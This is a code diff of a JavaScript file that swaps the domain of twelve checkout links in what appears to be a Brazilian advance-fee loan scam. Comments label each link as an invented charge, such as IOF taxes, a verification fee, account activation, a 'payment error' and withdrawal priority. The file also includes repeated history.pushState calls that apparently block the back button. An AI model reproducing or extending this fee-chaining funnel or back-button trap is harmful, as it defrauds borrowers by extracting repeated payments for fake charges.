@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.blackfridaytech.site/YL9jZDWqzp83p4q", // IOF
-    up2: "https://pay.blackfridaytech.site/DPXw3Xe7MWdZzmp", // Taxa de verificação de IOF
-    up3: "https://pay.blackfridaytech.site/bz5KZbVaM2YZ7dL", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.blackfridaytech.site/PyE2Zy8EJxn3qRb", // NFe
-    up5: "https://pay.blackfridaytech.site/NDr8gmKAkDqZBmj", // Ativar conta
-    up6: "https://pay.blackfridaytech.site/65XDZB8aV0bgVJw", // Taxa de registro do contrato
-    up7: "https://pay.blackfridaytech.site/n1NLgwJ9jrYGMxE", // Parabéns, 20k adicional
-    up8: "https://pay.blackfridaytech.site/N1nVZpYQl0AGlM6", // Erro no pagamento - 14,06
-    up9: "https://pay.blackfridaytech.site/xQBPZvRM5EaZmVq", // APP - 11,99
-    up10:"https://pay.blackfridaytech.site/DPXw3Xe7MpkZzmp", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.blackfridaytech.site/DPXw3Xe7M2kZzmp",// Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.blackfridaytech.site/zj6aGnAn1ydZwlK" // prioridade de saque  - 56,90
+    up1: "https://pay.finalizar.website/YL9jZDWqzp83p4q", // IOF
+    up2: "https://pay.finalizar.website/DPXw3Xe7MWdZzmp", // Taxa de verificação de IOF
+    up3: "https://pay.finalizar.website/bz5KZbVaM2YZ7dL", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.finalizar.website/PyE2Zy8EJxn3qRb", // NFe
+    up5: "https://pay.finalizar.website/NDr8gmKAkDqZBmj", // Ativar conta
+    up6: "https://pay.finalizar.website/65XDZB8aV0bgVJw", // Taxa de registro do contrato
+    up7: "https://pay.finalizar.website/n1NLgwJ9jrYGMxE", // Parabéns, 20k adicional
+    up8: "https://pay.finalizar.website/N1nVZpYQl0AGlM6", // Erro no pagamento - 14,06
+    up9: "https://pay.finalizar.website/xQBPZvRM5EaZmVq", // APP - 11,99
+    up10:"https://pay.finalizar.website/DPXw3Xe7MpkZzmp", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.finalizar.website/DPXw3Xe7M2kZzmp",// Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.finalizar.website/zj6aGnAn1ydZwlK" // prioridade de saque  - 56,90
   
 };
 
@@ -61,4 +61,5 @@ function redirect(key) {
 history.pushState({}, '', location.href);
 
 history.pushState({}, '', location.href);
+
 
